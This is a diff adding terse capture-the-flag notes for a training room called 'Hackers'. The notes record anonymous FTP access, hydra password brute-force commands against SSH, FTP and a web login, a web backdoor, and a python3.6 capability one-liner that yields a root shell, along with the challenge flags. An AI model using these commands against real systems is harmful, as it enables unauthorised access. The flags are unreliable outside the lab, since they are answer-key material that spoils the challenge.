@@ -1,0 +1,46 @@
+Hackers:
+21 (vsftp 2.0.8)
+ftp in
+anonymous
+(no password)
+ls
+get note
+get .flag
+thm{678d0231fb4e2150afc1c4e336fcf44d}
+read note, some users have weak passwords
+user rcampbell has passwords of either:
+god
+sex
+love
+secret
+Locked out by other user at this point, ftp is main exploit route
+rcampbell (22)
+hydra ssh://10.10.99.187 -l rcampbell -P /usr/share/wordlists/rockyou.txt
+rcampbell:zxcvbn
+thm{12361ad240fec43005844016092f1e05}
+gcrawford (21)
+hydra ftp://10.10.99.187 -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64
+22
+80 (web server)
+Flag in CSS
+thm{b63670f7192689782a45d8044c63197f}
+http://10.10.86.177/backdoor/
+there is a cookie.js?
+possible authentication with cookie?
+found that login waits for a response from the server.
+if the response is not “Incorrect Credentials”...
+it sets the cookie == password
+redirects to shell
+Webshell has token validation, major problem…
+hydra -l plague -p /usr/share/wordlists/rockyou.txt 10.10.181.169 http-post-form “/api/login:username=^USER^&password=^PASS^:Incorrect credentials”
+Priv Esc
+used Linpeas
+found suid binary at
+doesn’t look vulnerable from gtfobins, but there is an old CVE
+python3.6 has cap_suid on!!!
+python3.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id = root
+thm{b94f8d2e715973f8bc75fe099c8492c4}
+
+Writeup: https://jc01.ninja/ctf/hackers/
+
